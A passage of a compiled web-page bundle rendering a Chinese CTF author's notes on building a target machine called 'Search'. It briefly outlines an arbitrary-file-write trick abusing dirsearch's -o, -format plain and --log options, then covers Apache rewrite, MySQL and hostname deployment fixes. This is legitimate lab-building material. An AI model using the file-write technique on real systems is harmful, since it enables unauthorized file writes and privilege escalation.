"),a("li",[s._v("2、利用 -o 参数控制任意文件")]),s._v(" "),a("li",[s._v("3、使用 -format 参数指定输出类型为plain，这个类型下，会记录 dirsearch 的启动命令行参数")]),s._v(" "),a("li",[s._v("4、使用 --log 参数值控制写入内容，单引号构造换行")])]),s._v(" "),a("p",[a("strong",[s._v("07、可行测试")])]),s._v(" "),a("p",[s._v("出题人本地测试可行")]),s._v(" "),a("p",[a("strong",[s._v("08、靶机名称")])]),s._v(" "),a("p",[s._v("Search 靶机，靶机重点使用了 dirsearch 工具以及入口处 cms 考察的开源情报收集能力，所以给靶机取名 Search。")]),s._v(" "),a("p",[s._v("小故事：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/56.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_14、遇到的问题"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_14、遇到的问题"}},[s._v("#")]),s._v(" 14、遇到的问题")]),s._v(" "),a("h3",{attrs:{id:"问题1-靶机-apache-默认未启用-rewrite-模块"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#问题1-靶机-apache-默认未启用-rewrite-模块"}},[s._v("#")]),s._v(" 问题1：靶机 apache 默认未启用 rewrite 模块")]),s._v(" "),a("p",[s._v("非预期：完成以上配置重启apache后，配置的工作目录 /var/www/html/frontend/web 没有生效"),a("br"),s._v("\n原因：因为启用了包含 RewriteEngine 的 VirtualHost 配置，但未启用 rewrite 模块，导致配置语法检查不通过，apache2ctl configtest 报错，服务无法正常加载新的站点配置；"),a("br"),s._v("\n结果就是：访问时仍然落在原来默认的 DocumentRoot /var/www/html，看起来像是“新配置没生效”。（具体表现取决于当时服务是否已经在运行：可能直接启动失败，也可能继续使用旧的配置。）")]),s._v(" "),a("h3",{attrs:{id:"问题2-靶机默认无-mysql-服务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#问题2-靶机默认无-mysql-服务"}},[s._v("#")]),s._v(" 问题2：靶机默认无 MySQL 服务")]),s._v(" "),a("p",[s._v("现象：CMS 页面报 PDO 异常，提示连接 MySQL 失败。"),a("br"),s._v("\n原因：模板系统没有内置 MySQL 服务，需要额外部署；同时 "),a("code",[s._v("/run")]),s._v(" 是 tmpfs，早期用 "),a("code",[s._v("/var/run/mysqld")]),s._v(' 手动建目录的方式，重启后目录会消失，导致 Yii2 报 "No such file or directory"。')]),s._v(" "),a("p",[s._v("最终做法：采用二进制部署 + systemd 的 "),a("code",[s._v("RuntimeDirectory=mysqld")]),s._v(" 管理 "),a("code",[s._v("/run/mysqld")]),s._v("，具体步骤见前文「安装 MySQL 数据库」小节。")]),s._v(" "),a("h3",{attrs:{id:"问题3-cms-部署时未使用域名"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#问题3-cms-部署时未使用域名"}},[s._v("#")]),s._v(" 问题3：CMS 部署时未使用域名")]),s._v(" "),a("p",[s._v("现象：靶机在构建时硬编码了 IP，在分发给选手时出现部分资源加载问题。\n原因：CMS 部署时未使用域名，导致部分资源加载失败。")]),s._v(" "),a("p",[s._v("解决方案：")]),s._v(" "),a("ul",[a("li",[s._v("1、在靶机 /etc/hosts 里添加域名映射 127.0.0.1 example.com")]),s._v(" "),a("li",[s._v("2、apache 配置文件里添加 ServerName example.com")]),s._v(" "),a("li",[s._v("3、CMS 部署时使用 example.com 作为站点域名")])])])}),[],!1,null,null,null);a.default=r.exports}}]);